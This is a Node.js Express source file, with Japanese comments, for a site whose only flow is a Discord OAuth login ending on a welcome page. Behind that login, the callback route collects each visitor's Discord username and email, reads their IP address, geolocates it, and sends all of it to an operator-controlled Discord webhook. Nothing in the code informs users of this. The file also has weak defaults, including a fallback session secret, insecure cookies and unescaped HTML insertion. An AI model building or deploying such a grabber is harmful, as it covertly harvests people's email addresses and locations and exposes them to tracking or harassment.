import express from "express";
import session from "express-session";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;

// --- セッション設定 ---
app.use(session({
  secret: process.env.SESSION_SECRET || "秘密鍵",
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // HTTPS 環境なら true
}));

// --- Discord OAuth2 設定 ---
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI; // 例: "https://test-x9iq.onrender.com/callback"
const OAUTH_SCOPE = "identify email";

// --- Discord Webhook URL ---
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

// --- ログイン ---
app.get("/login", (req, res) => {
  const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${OAUTH_SCOPE}`;
  res.redirect(url);
});

// --- コールバック ---
app.get("/callback", async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect("/login");

  // アクセストークン取得
  const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: "authorization_code",
      code,
      redirect_uri: REDIRECT_URI,
      scope: OAUTH_SCOPE
    })
  });

  const tokenData = await tokenRes.json();
  if (tokenData.error) return res.send("認証エラー");

  // ユーザー情報取得
  const userRes = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${tokenData.access_token}` }
  });
  const userData = await userRes.json();

  // --- IP取得 & Geo情報 ---
  const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.connection.remoteAddress;
  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
  const geo = await geoRes.json();

  // --- Discord Webhook送信 ---
  if (DISCORD_WEBHOOK) {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `ログイン情報：
ユーザー: ${userData.username}#${userData.discriminator}
メール: ${userData.email}
IP: ${ip}
地域: ${geo.region || "不明"} / ${geo.city || "不明"}`
      })
    });
  }

  // セッションに保存
  req.session.user = {
    username: userData.username,
    discriminator: userData.discriminator,
    email: userData.email
  };

  res.redirect("/welcome");
});

// --- Welcome ページ ---
app.get("/welcome", (req, res) => {
  const user = req.session.user;
  if (!user) return res.redirect("/login");

  let html = fs.readFileSync(path.join(__dirname, "public", "welcome.html"), "utf-8");
  html = html.replace("{{ username }}", user.username).replace("{{ discriminator }}", user.discriminator);
  res.send(html);
});

// --- ルートはログインへリダイレクト ---
app.get("/", (req, res) => res.redirect("/login"));

// --- サーバー起動 ---
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
